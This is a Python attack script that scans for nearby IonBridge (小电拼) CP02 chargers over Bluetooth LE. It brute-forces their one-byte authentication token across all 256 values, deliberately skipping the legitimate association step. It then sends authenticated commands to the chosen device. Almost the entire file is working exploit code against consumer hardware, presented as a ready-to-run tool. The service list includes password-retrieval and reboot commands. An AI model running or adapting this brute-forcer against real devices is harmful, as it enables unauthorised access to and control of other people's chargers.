#!/usr/bin/env python3
"""
BLE Token Bruteforce for 小电拼 (IonBridge) Device
Based on IonBridge open source code analysis:
https://github.com/ifanrx/IonBridge

Protocol Structure (BLEHeader - 9 bytes):
- version (1 byte): Protocol version (0x00)
- id (1 byte): Message ID (increments)
- service (1 byte): Service command (positive=request, negative=response)
- sequence (1 byte): Sequence number for fragmentation
- flags (1 byte): TCP-like flags (SYN=0x1, ACK=0x2, FIN=0x3, RST=0x4, SYN_ACK=0x5)
- size (3 bytes): Payload size (big-endian for version 0)
- checksum (1 byte): Sum of header bytes (excluding checksum itself)

Token Validation:
- Token is a single byte (0x00-0xFF, only 256 possibilities!)
- Token is the FIRST byte of payload
- Only ASSOCIATE_DEVICE (0x10) does NOT require token
- All other services require valid token

Strategy:
1. First call ASSOCIATE_DEVICE (0x10) to get the token
2. If that fails, bruteforce all 256 token values
"""

import asyncio
import struct
from bleak import BleakClient, BleakScanner

# Target device configuration
TARGET_NAME = "CP02-002548"
SERVICE_UUID = "048e3f2e-e1a6-4707-9e74-a930e898a1ea"
CHAR_TX_UUID = "148e3f2e-e1a6-4707-9e74-a930e898a1ea"  # Notify (device -> app)
CHAR_RX_UUID = "248e3f2e-e1a6-4707-9e74-a930e898a1ea"  # Write (app -> device)

# Service Commands (from service.h)
class ServiceCommand:
    BLE_ECHO_TEST = 0x00
    GET_DEBUG_LOG = 0x01
    GET_DEVICE_PASSWORD = 0x05
    ASSOCIATE_DEVICE = 0x10  # This one does NOT require token!
    REBOOT_DEVICE = 0x11
    GET_DEVICE_SERIAL_NO = 0x13
    GET_DEVICE_UPTIME = 0x14
    GET_AP_VERSION = 0x15
    GET_DEVICE_BLE_ADDR = 0x19
    SWITCH_DEVICE = 0x1a
    GET_DEVICE_MODEL = 0x1c
    GET_POWER_STATISTICS = 0x41

# BLE Flags
BLE_NONE = 0x0
BLE_SYN = 0x1
BLE_ACK = 0x2
BLE_FIN = 0x3
BLE_RST = 0x4
BLE_SYN_ACK = 0x5


def calc_checksum(header_bytes: bytes) -> int:
    """Calculate checksum: sum of all header bytes (excluding checksum itself)"""
    return sum(header_bytes[:-1]) & 0xFF


def build_message(version: int, msg_id: int, service: int, sequence: int, 
                  flags: int, payload: bytes) -> bytes:
    """
    Build a complete BLE message with header and payload.
    
    Header structure (9 bytes):
    - version (1 byte)
    - id (1 byte)
    - service (1 byte, signed)
    - sequence (1 byte)
    - flags (1 byte)
    - size (3 bytes, big-endian for version 0)
    - checksum (1 byte)
    """
    payload_size = len(payload)
    
    # Build header without checksum first
    # Size is 3 bytes, big-endian for version 0
    size_bytes = struct.pack('>I', payload_size)[1:]  # Take last 3 bytes (big-endian)
    
    header = bytes([
        version,
        msg_id,
        service & 0xFF,  # Handle signed service
        sequence,
        flags,
        size_bytes[0],
        size_bytes[1],
        size_bytes[2],
        0  # Placeholder for checksum
    ])
    
    # Calculate and set checksum
    checksum = calc_checksum(header)
    header = header[:-1] + bytes([checksum])
    
    return header + payload


def parse_response(data: bytes) -> dict:
    """Parse a BLE response message"""
    if len(data) < 9:
        return {"error": "Response too short"}
    
    version = data[0]
    msg_id = data[1]
    service = struct.unpack('b', bytes([data[2]]))[0]  # Signed byte
    sequence = data[3]
    flags = data[4]
    
    # Parse size (3 bytes)
    if version == 0:
        size = (data[5] << 16) | (data[6] << 8) | data[7]
    else:
        size = data[5] | (data[6] << 8) | (data[7] << 16)
    
    checksum = data[8]
    payload = data[9:9+size] if len(data) > 9 else b''
    
    return {
        "version": version,
        "id": msg_id,
        "service": service,
        "sequence": sequence,
        "flags": flags,
        "size": size,
        "checksum": checksum,
        "payload": payload,
        "raw": data.hex()
    }


class IonBridgeBLE:
    def __init__(self):
        self.client = None
        self.msg_id = 0
        self.response_received = asyncio.Event()
        self.last_response = None
        self.found_token = None
        
    def notification_handler(self, sender, data):
        """Handle notifications from the device"""
        print(f"\n[<] Received {len(data)} bytes: {data.hex()}")
        parsed = parse_response(data)
        print(f"    Parsed: {parsed}")
        self.last_response = parsed
        self.response_received.set()
        
        # Check if we got a valid response (not error)
        if parsed.get("service", 0) < 0:  # Negative service = response
            if parsed.get("payload"):
                print(f"    [!] Got payload: {parsed['payload'].hex()}")
    
    async def connect(self, address: str):
        """Connect to the device"""
        print(f"[*] Connecting to {address}...")
        self.client = BleakClient(address)
        await self.client.connect()
        print(f"[+] Connected!")
        
        # Subscribe to notifications
        await self.client.start_notify(CHAR_TX_UUID, self.notification_handler)
        print(f"[+] Subscribed to notifications")
    
    async def disconnect(self):
        """Disconnect from the device"""
        if self.client and self.client.is_connected:
            await self.client.disconnect()
            print("[*] Disconnected")
    
    async def send_message(self, service: int, payload: bytes = b'', 
                          flags: int = BLE_SYN, timeout: float = 2.0) -> dict:
        """Send a message and wait for response"""
        self.msg_id = (self.msg_id + 1) & 0xFF
        
        message = build_message(
            version=0,
            msg_id=self.msg_id,
            service=service,
            sequence=0,
            flags=flags,
            payload=payload
        )
        
        print(f"\n[>] Sending service 0x{service:02X}, payload: {payload.hex() if payload else 'empty'}")
        print(f"    Full message: {message.hex()}")
        
        self.response_received.clear()
        self.last_response = None
        
        await self.client.write_gatt_char(CHAR_RX_UUID, message, response=False)
        
        try:
            await asyncio.wait_for(self.response_received.wait(), timeout=timeout)
            return self.last_response
        except asyncio.TimeoutError:
            print(f"    [!] Timeout waiting for response")
            return None
    
    async def try_associate(self) -> int:
        """
        Try ASSOCIATE_DEVICE command to get the token.
        This is the only command that doesn't require a token!
        """
        print("\n" + "="*60)
        print("[*] Trying ASSOCIATE_DEVICE (0x10) - No token required!")
        print("="*60)
        
        response = await self.send_message(ServiceCommand.ASSOCIATE_DEVICE)
        
        if response and response.get("payload"):
            token = response["payload"][0]
            print(f"\n[!!!] SUCCESS! Got token: 0x{token:02X} ({token})")
            return token
        
        print("[!] ASSOCIATE_DEVICE failed or returned no token")
        return None
    
    async def bruteforce_token(self, service: int = ServiceCommand.GET_DEVICE_MODEL) -> int:
        """
        Bruteforce all 256 possible token values.
        Uses GET_DEVICE_MODEL as the test command.
        """
        print("\n" + "="*60)
        print(f"[*] Starting token bruteforce (0x00 - 0xFF)")
        print(f"[*] Using service: 0x{service:02X}")
        print("="*60)
        
        for token in range(256):
            if token % 16 == 0:
                print(f"\n[*] Testing tokens 0x{token:02X} - 0x{min(token+15, 255):02X}...")
            
            # Token is the first byte of payload
            payload = bytes([token])
            response = await self.send_message(service, payload, timeout=0.5)
            
            if response:
                # Check if we got a valid response (negative service = response)
                if response.get("service", 0) < 0:
                    # Check if it's not an error response
                    # A successful response typically has payload
                    if response.get("size", 0) > 0:
                        print(f"\n[!!!] FOUND TOKEN: 0x{token:02X} ({token})")
                        self.found_token = token
                        return token
            
            await asyncio.sleep(0.05)  # Small delay between attempts
        
        print("\n[!] Bruteforce complete - no valid token found")
        return None


async def scan_for_devices(prefix: str = "CP02-", timeout: float = 10.0):
    """Scan for all devices with the given prefix"""
    print(f"[*] Scanning for devices starting with '{prefix}'...")
    
    devices = await BleakScanner.discover(timeout=timeout)
    
    # Filter devices with the prefix
    matching_devices = []
    for device in devices:
        if device.name and device.name.startswith(prefix):
            matching_devices.append(device)
            print(f"    Found: {device.name} ({device.address})")
    
    return matching_devices


def select_device(devices: list):
    """Let user select a device from the list"""
    if not devices:
        print("[!] No matching devices found")
        return None
    
    print("\n" + "="*60)
    print("  Available Devices:")
    print("="*60)
    
    for i, device in enumerate(devices):
        print(f"  [{i + 1}] {device.name} ({device.address})")
    
    print("  [0] Cancel")
    print("="*60)
    
    while True:
        try:
            choice = input("\n[?] Select device number: ").strip()
            if choice == '0':
                return None
            
            idx = int(choice) - 1
            if 0 <= idx < len(devices):
                selected = devices[idx]
                print(f"\n[+] Selected: {selected.name} ({selected.address})")
                return selected
            else:
                print(f"[!] Please enter a number between 1 and {len(devices)}")
        except ValueError:
            print("[!] Please enter a valid number")
        except KeyboardInterrupt:
            print("\n[!] Cancelled")
            return None


async def main():
    print("="*60)
    print("  IonBridge (小电拼) BLE Token Finder")
    print("  Based on: https://github.com/ifanrx/IonBridge")
    print("="*60)
    
    # Scan for all CP02- devices
    devices = await scan_for_devices(prefix="CP02-")
    
    if not devices:
        print("\n[!] No CP02- devices found. Please make sure the device is powered on and nearby")
        return
    
    # Let user select a device
    device = select_device(devices)
    if not device:
        print("\n[!] No device selected, exiting...")
        return
    
    # Connect and try to get token
    ble = IonBridgeBLE()
    
    try:
        await ble.connect(device.address)
        
        # Method 1: Try ASSOCIATE_DEVICE first (doesn't require token)
        # ✅ 修改后：直接把这行注释掉，或者强制设为 None
        print("Skipping ASSOCIATE_DEVICE, forcing Bruteforce...")
        token = None 
        
        if token is None:
            # Method 2: Bruteforce if ASSOCIATE_DEVICE didn't work
            print("\n[*] ASSOCIATE_DEVICE didn't return token, starting bruteforce...")
            token = await ble.bruteforce_token()
        
        if token is None:
            # Method 2: Bruteforce if ASSOCIATE_DEVICE didn't work
            print("\n[*] ASSOCIATE_DEVICE didn't return token, starting bruteforce...")
            token = await ble.bruteforce_token()
        
        if token is not None:
            print("\n" + "="*60)
            print(f"  [SUCCESS] Token found: 0x{token:02X} ({token})")
            print("="*60)
            
            # Try some commands with the found token
            print("\n[*] Testing token with various commands...")
            
            for cmd_name, cmd in [
                ("GET_DEVICE_MODEL", ServiceCommand.GET_DEVICE_MODEL),
                ("GET_AP_VERSION", ServiceCommand.GET_AP_VERSION),
                ("GET_DEVICE_UPTIME", ServiceCommand.GET_DEVICE_UPTIME),
            ]:
                print(f"\n[*] Trying {cmd_name}...")
                response = await ble.send_message(cmd, bytes([token]))
                if response and response.get("payload"):
                    try:
                        payload_str = response["payload"].decode('utf-8', errors='replace')
                        print(f"    Response: {payload_str}")
                    except:
                        print(f"    Response (hex): {response['payload'].hex()}")
        else:
            print("\n[!] Failed to find token")
            
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        await ble.disconnect()


if __name__ == "__main__":
    asyncio.run(main())
